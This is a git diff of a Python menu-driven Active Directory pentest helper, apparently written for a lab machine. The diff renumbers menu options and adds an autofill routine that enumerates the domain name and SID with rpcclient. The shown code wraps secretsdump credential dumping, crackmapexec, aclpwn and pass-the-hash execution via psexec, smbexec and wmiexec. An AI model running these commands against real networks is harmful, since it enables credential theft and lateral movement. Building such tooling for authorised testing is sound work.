@@ -256,18 +256,50 @@ def display():
    print('\u2560' + ('\u2550')*14 + '\u2567'+ ('\u2550')*21  + '\u2569' + ('\u2550')*12 + '\u2550' + ('\u2550')*20 + '\u2569' + ('\u2550')*61 + '\u2563')
 
 def options():
-   print('\u2551' + "(0) Save/Exit          (10) Re/Set WIN COMMAND (20) Get Arch (30) Enum4Linux     (40) Kerb Users Info (50) Golden PAC   (60) FTP    " + '\u2551')
-   print('\u2551' + "(1) Re/Set DNS SERVER  (11) Re/Set CLOCK TIME  (21) Net View (31) WinDap Search  (41) Kerb Filter     (51) Domain Dump  (61) SSH    " + '\u2551')
-   print('\u2551' + "(2) Re/Set REMOTE IP   (12) Re/Set DIRECTORY   (22) Services (32) Lookup Sids    (42) Kerb Bruteforce (52) Blood Hound  (62) TelNet " + '\u2551')
-   print('\u2551' + "(3) Re/Set USERNAME    (13) Check Connection   (23) AtExec   (33) Sam Dump Users (43) Kerb Roasting   (53) BH ACLPwn    (63) NetCat " + '\u2551')
-   print('\u2551' + "(4) Re/Set PASSWORD    (14) Check DNS Records  (24) DcomExec (34) Rpc Dump       (44) Kerb ASREPRoast (54) Secrets Dump (64) WinRM  " + '\u2551')
-   print('\u2551' + "(5) Re/Set NTLM HASH   (15) Check DNS SERVER   (25) PsExec   (35) REGistery      (45) PASSWORD2HASH   (55) CrackMapExec (65) Desktop" + '\u2551')
-   print('\u2551' + "(6) Re/Set DOMAIN NAME (16) Nmap O/S + Skew    (26) SmbExec  (36) Smb Client     (46) Pass the Hash   (56) PsExec HASH  (66)        " + '\u2551')
-   print('\u2551' + "(7) Re/Set DOMAIN SID  (17) Nmap Subdomains    (27) WmiExec  (37) SmbMap SHARE   (47) Pass the Ticket (57) SmbExec HASH (67)        " + '\u2551')
-   print('\u2551' + "(8) Re/Set SHARE NAME  (18) Nmap Intense TCP   (28) IfMap    (38) SmbMount SHARE (48) Silver Ticket   (58) WmiExec HASH (68)        " + '\u2551')
-   print('\u2551' + "(9) Re/Set IMPERSONATE (19) Nmap Slow and Full (29) OpDump   (39) Rpc Client     (49) Golden Ticket   (59) Gen Userlist (69) Editor " + '\u2551')
+   print('\u2551' + "(0) Save/Exit          (10) Re/Set WINCOMMAND (20) Get Arch (30) Enum4Linux     (40) Kerb Users Info (50) Golden PAC   (60) FTP     " + '\u2551')
+   print('\u2551' + "(1) Re/Set DNS SERVER  (11) Re/Set CLOCK TIME (21) Net View (31) WinDap Search  (41) Kerb Filter     (51) Domain Dump  (61) SSH     " + '\u2551')
+   print('\u2551' + "(2) Re/Set REMOTE IP   (12) Re/Set DIRECTORY  (22) Services (32) Lookup Sids    (42) Kerb Bruteforce (52) ACLPWN       (62) TelNet  " + '\u2551')
+   print('\u2551' + "(3) Re/Set USERNAME    (13) Check Connection  (23) AtExec   (33) Sam Dump Users (43) Kerb Roasting   (53) Secrets Dump (63) NetCat  " + '\u2551')
+   print('\u2551' + "(4) Re/Set PASSWORD    (14) Check DNS Records (24) DcomExec (34) Rpc Dump       (44) Kerb ASREPRoast (54) CrackMapExec (64) WinRM   " + '\u2551')
+   print('\u2551' + "(5) Re/Set NTLM HASH   (15) Check DNS SERVER  (25) PsExec   (35) REGistery      (45) PASSWORD2HASH   (55) PsEcec HASH  (65) Desktop " + '\u2551')
+   print('\u2551' + "(6) Re/Set DOMAIN NAME (16) Nmap O/S + Skew   (26) SmbExec  (36) Smb Client     (46) Pass the Hash   (56) SmbExwc HASH (66)         " + '\u2551')
+   print('\u2551' + "(7) Re/Set DOMAIN SID  (17) Nmap Subdomains   (27) WmiExec  (37) SmbMap SHARE   (47) Pass the Ticket (57) WmiExec HASh (67)         " + '\u2551')
+   print('\u2551' + "(8) Re/Set SHARE NAME  (18) Nmap Intense TCP  (28) IfMap    (38) SmbMount SHARE (48) Silver Ticket   (58) Gen UserList (68)         " + '\u2551')
+   print('\u2551' + "(9) Re/Set IMPERSONATE (19) Nmap Slow & Full  (29) OpDump   (39) Rpc Client     (49) Golden Ticket   (59) List Editor  (69) Autofill" + '\u2551')
    print('\u255A' + ('\u2550')*132 + '\u255D')
 
+def stage1(DOM, SID):
+      if TIP[:5] == "EMPTY": 
+         print("\nPlease specify a valid remote IP address...")
+         return
+      else:
+         command("rpcclient -W '' -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" ") + " " + TIP.rstrip(" ") + " -c 'lsaquery' > temp.txt")
+
+      print("\n[+] Attempting to enumerate DOMAIN name...")
+      temp = linecache.getline("temp.txt", 1)
+      if temp[:6] != "Cannot":
+         temp1,DOM = temp.split(":")
+         DOM = DOM.strip(" ")
+         if len(DOM) < COL1:
+            DOM = padding(DOM, COL1)
+         print("[*] Found Domain", DOM)
+      else:
+         print("[-] Unable to enumerate DOMAIN...")   
+
+      print("\n[+] Attempting to enumerate domain SID...")
+      temp2 = linecache.getline("temp.txt", 2)
+      if temp[:6] != "Cannot":
+         temp2,SID = temp2.split(":")
+         SID = SID.strip(" ")
+         if len(SID) < COL1:
+            SID = padding(SID, COL1)
+         print("[*] Found SID", SID)
+      else:
+         print("[-] Unable to enumerate SID...")    
+
+      os.remove("temp.txt")
+      return [DOM, SID]
+ 
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
@@ -414,6 +446,7 @@ input("\nPlease ENTER key to continue...")
 
 while True: 
    command("clear")
+   linecache.clearcache()
    LTM = gettime(COL1)
    display()
    options()
@@ -1458,23 +1491,11 @@ while True:
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : Sauna
-# Details : Menu option selected - BLOODHOUND STUFF!!
-# Modified: N/A
-# -------------------------------------------------------------------------------------
-
-   if selection =='52':
-      print("Reserved for BLOODHOUND command...")
-      prompt()
-
-# ------------------------------------------------------------------------------------- 
-# AUTHOR  : Terence Broadbent                                                    
-# CONTRACT: GitHub
-# Version : Sauna
 # Details : Menu option selected - aclpwn - du neo4j password -f USER - d DOMAIN -sp PASSWORD -s IP.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='53':
+   if selection =='52':
       command("aclpwn -du " + BH1 + " -dp " + BH2 + " -f " + USR.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -sp '" + PAS.rstrip(" ") +"' -s " + TIP.rstrip(" "))
       prompt()
 
@@ -1486,7 +1507,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='54':
+   if selection =='53':
       print("\n[*] Please wait...")
       command(PATH + "secretsdump.py " + DOM.rstrip(" ") + '/' + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" ") + " > SECRETS.tmp")
 
@@ -1526,7 +1547,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='55':
+   if selection =='54':
       print("\n[+] Trying user " + USR.rstrip(" ") + " with password '" + PAS.rstrip(" ") +"'...\n")
       command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\" + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' --local-auth --shares")
       
@@ -1550,7 +1571,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='56':
+   if selection =='55':
       print("\n[+] Trying user " + USR.rstrip(" ") + " with NTM HASH " + NTM.rstrip("\n") + "...\n")
       command(PATH + "psexec.py -hashes :" + NTM.rstrip("\n") + " " + USR.rstrip(" ") + "@" + TIP.rstrip(" "))
 
@@ -1574,7 +1595,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='57':
+   if selection =='56':
       print("\n[+] Trying user " + USR.rstrip(" ") + " with NTM HASH " + NTM.rstrip(" ") + "...\n")
       command(PATH + "smbexec.py -hashes :" + NTM.rstrip(" ") + " " + DOM.rstrip(" ") + "\\" + USR.rstrip(" ") + "@" + TIP.rstrip(" "))      
       
@@ -1598,7 +1619,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='58':
+   if selection =='57':
       print("\n[+] Trying user " + USR.rstrip(" ") + " with NTLM HASH " + NTM.rstrip("\n") + "...\n")
       command(PATH + "wmiexec.py -hashes :" + NTM.rstrip("\n") + " " + USR.rstrip(" ") + "@" + TIP.rstrip(" "))
       
@@ -1622,7 +1643,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='59':
+   if selection =='58':
       command("cewl -d 3 -m 5 -w users.txt " + TIP.rstrip(" ") + " 2>&1")
       print("\n[+] Userlist generated via website...")
 
@@ -1635,6 +1656,23 @@ while True:
          US[x] = linecache.getline("users.txt", x+1).rstrip(" ")
          if len(US[x]) < COL3: US[x] = padding(US[x], COL3)      
 
+      if US[12][:1] != " ": US[11] = "Some users are not shown!!"
+      prompt()
+
+#------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : Sauna
+# Details : Menu option selected - Nano users.txt
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection =='59':
+      command("nano users.txt")
+
+      for x in range (0, MAX):
+         US[x] = linecache.getline("users.txt", x + 1).rstrip(" ")
+         if len(US[x]) < COL3: US[x] = padding(US[x], COL3)      
       if US[12][:1] != " ": US[11] = "Some users are not shown!!"
       prompt()
 
@@ -1719,7 +1757,7 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='67':
-      exit(1)       
+      exit(1) 
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -1731,22 +1769,18 @@ while True:
 
    if selection =='68':
       exit(1)
- 
-#------------------------------------------------------------------------------------- 
+
+# ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : Sauna
-# Details : Menu option selected - Nano users.txt
+# Details : Menu option selected - Autofill parameters.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='69':
-      command("nano users.txt")
-
-      for x in range (0, MAX):
-         US[x] = linecache.getline("users.txt", x + 1).rstrip(" ")
-         if len(US[x]) < COL3: US[x] = padding(US[x], COL3)      
-      if US[12][:1] != " ": US[11] = "Some users are not shown!!"
+      DOM, SID = stage1(DOM, SID)
       prompt()
 
-#Eof...	
+# -------------------------------------------------------------------------------------
+# Eof...	
